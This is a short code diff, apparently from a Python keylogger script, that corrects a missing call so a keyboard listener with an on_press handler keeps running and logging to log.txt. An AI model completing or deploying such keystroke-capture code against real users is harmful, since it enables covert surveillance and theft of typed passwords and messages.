@@ -35,4 +35,4 @@ if __name__ == '__main__':
         makelog = open('log.txt', 'w').close()
 
     with Listener(on_press=on_press) as Listner:
-        Listner.join
+        Listner.join()
